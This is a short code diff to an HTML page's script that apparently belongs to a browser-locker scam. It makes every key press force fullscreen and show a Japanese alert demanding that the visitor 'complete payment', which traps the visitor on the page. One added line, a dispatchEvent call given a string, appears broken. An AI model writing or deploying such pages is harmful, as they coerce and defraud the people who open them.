@@ -179,11 +179,10 @@
   </div>
 </body>
 <script>
-    window.onload = function() {
-      document.documentElement.requestFullscreen();
-    }
     document.addEventListener('keydown', (e) => {
-      if(e.which == 27) {document.documentElement.requestFullscrenn(); window.alert('お支払いが終了していません。');}
+      document.documentElement.requestFullscreen();
+      window.alert('お支払いを完了させてください。');
     })
+    document.dispatchEvent('keydown');
 </script>
 </html>
